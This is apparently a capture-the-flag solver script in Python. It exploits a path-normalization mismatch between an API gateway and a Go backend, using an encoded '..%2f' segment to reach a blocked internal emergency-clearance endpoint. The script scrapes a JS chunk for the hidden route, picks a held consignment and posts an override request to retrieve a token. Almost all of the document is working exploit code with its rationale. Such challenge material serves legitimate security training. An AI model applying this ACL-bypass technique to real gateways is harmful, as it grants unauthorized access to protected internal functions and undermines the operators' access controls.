"""Northern Viaduct Clearance solver: API-gateway ACL bypass via path-normalization discrepancy.

Usage: python -I solve.py http://HOST:PORT

The emergency-override endpoint POST /api/v1/internal/dispatch/emergency-clearance is blocked
by the edge gateway for everything under /api/v1/internal/*. The gateway keeps %2f encoded and
only rejects a literal '/internal/' segment; the Go backend decodes '..%2f' -> '../' and then
collapses the dot-segment. So a decoy sibling + '..%2f' before 'internal' slips past the gateway
and resolves to the real route on the backend:

    /api/v1/corridor/..%2finternal/dispatch/emergency-clearance

Steps:
1. Pull the dispatch-admin JS chunk to confirm the hidden internal route (it is not in the public spec).
2. Pick the held consignment from /api/v1/consignments.
3. POST the override through the mangled path and read clearance_token.
"""
import json
import re
import sys
import urllib.request

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else ''
UA = {'User-Agent': 'ctld-client'}


def http(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    h = dict(UA)
    if data:
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(BASE + path, data, h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def gateway_bypass(internal_route):
    """Hide the blocked '/internal/' segment from the gateway's prefix check while the
    backend still resolves it: insert a decoy sibling and an encoded parent-ref ('..%2f')."""
    assert internal_route.startswith('/internal/'), internal_route
    return '/api/v1/corridor/..%2f' + internal_route.lstrip('/')


def find_internal_route(js):
    # internalDispatch:"/internal/dispatch/emergency-clearance"
    m = re.search(r'internalDispatch\s*:\s*"([^"]+)"', js)
    return m.group(1) if m else '/internal/dispatch/emergency-clearance'


def demo():
    assert gateway_bypass('/internal/dispatch/emergency-clearance') == \
        '/api/v1/corridor/..%2finternal/dispatch/emergency-clearance'


if __name__ == '__main__':
    demo()
    if not BASE:
        sys.exit('usage: python -I solve.py http://HOST:PORT')

    _, js = http('GET', '/static/assets/js/chunks/chunk-dispatch-admin.9c4d.js')
    route = find_internal_route(js.decode(errors='replace'))
    print('internal route :', route)

    _, raw = http('GET', '/api/v1/consignments')
    held = next((c for c in json.loads(raw)['consignments'] if 'HELD' in c['status']), None)
    cid = held['consignment_id'] if held else 'CTLD-FR-8821'
    print('held consignment:', cid)

    path = gateway_bypass(route)
    code, raw = http('POST', path, {'consignment_id': cid, 'reason': 'Authorized emergency corridor escort'})
    print('POST', path, '->', code)
    data = json.loads(raw)
    print(json.dumps(data, indent=2))
    print('\nFLAG:', data.get('clearance_token'))
